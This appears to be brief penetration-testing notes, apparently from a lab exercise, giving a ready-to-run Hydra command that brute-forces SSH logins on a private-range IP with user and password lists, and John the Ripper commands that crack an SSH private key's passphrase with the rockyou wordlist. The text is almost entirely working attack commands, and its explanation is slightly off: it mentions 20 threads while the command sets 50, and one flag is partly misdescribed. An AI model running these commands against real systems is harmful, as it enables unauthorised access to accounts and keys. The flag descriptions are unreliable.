<https://linuxconfig.org/ssh-password-testing-with-hydra-on-kali-linux>

Bruteforce ssh with hydra using userlist, passwordlist, verbose, 20 threads, testing users without password, testing users who reused their old password, and finally making sure hydra doesn't retry failed entries:
hydra -L ../users.txt -P passwordfile.txt 10.10.77.213 ssh -V -e nsr -f -t 50 -K

Cracking ssh private keys:
[/usr/share/john/ssh2john.py](file L3Vzci9zaGFyZS9qb2huL3NzaDJqb2huLnB5) id_rsa > id_rsa.john

john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john
